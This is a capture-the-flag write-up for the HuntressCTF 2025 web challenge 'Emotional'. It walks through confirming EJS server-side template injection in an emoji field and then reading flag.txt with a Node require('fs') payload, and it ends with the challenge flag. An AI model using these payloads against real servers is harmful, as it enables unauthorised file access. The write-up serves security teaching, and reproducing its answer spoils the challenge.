---
title: "HuntressCTF 2025 - Emotional"
date: 2025-10-06
categories: [Capture The Flags, HuntressCTF2025]
tags: [CTF, Writeups, Web, SSTI]
---

## Challeneg Prompt

Don't be shy, show your emotions! Get emotional if you have to! Uncover the flag.

---

The Challenge:

![web page](/assets/img/huntressCTF2025/emotional/web.png)

There is a interface through which we can select an emoji and update the page by clicking on the "update emotion" button

Setting up burp, capturing the request and then sending it to repeater

![burp](/assets/img/huntressCTF2025/emotional/burp.png)

![repeater](/assets/img/huntressCTF2025/emotional/repeater.png)

Here, we can see the site is running on nginx

---

Capturing the request for updating the emotion

```
POST /setEmoji HTTP/1.1
Host: 10.1.45.109
Content-Length: 18
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
Accept: */*
DNT: 1
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://10.1.45.109
Referer: http://10.1.45.109/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,hi;q=0.8,zh-TW;q=0.7,zh;q=0.6
Connection: keep-alive

emoji=%F0%9F%98%8A
```

Since we have to read the file on the server, possible options are SSTI, code injection to get a reverse shell and then reading. Let us start with trying for SSTI

---

### Payload 1

```
emoji=<%= 7*7 %>
```

Sending the request and here we can see it is shown as it is on the interface

![payload1_response](/assets/img/huntressCTF2025/emotional/payload1.png)

Upon loading the page again and seeing the response in repeater, we can see it is rendered as 49, therefore SSTI is confirmed

![payload1_reponse](/assets/img/huntressCTF2025/emotional/payload1_response.png)

so going ahead with SSTI to read the flag.txt

---

### Payload 2

```
emoji=<%= global.process.mainModule.require('fs').readFileSync('flag.txt', 'utf8') %>
```

*Explanation: <%= global.process.mainModule.require('fs').readFileSync('flag.txt', 'utf8') %> exploits EJS server-side template injection. It accesses Node’s global object to require the filesystem module and reads the contents of flag.txt, which is then output directly in the rendered HTML. This allows us to retrieve the flag from the server.*

Re-loading the page and seeing the response in burp 

![flag](/assets/img/huntressCTF2025/emotional/flag.png)

Flag: flag{8c8e0e59d1292298b64c625b401e8cfa}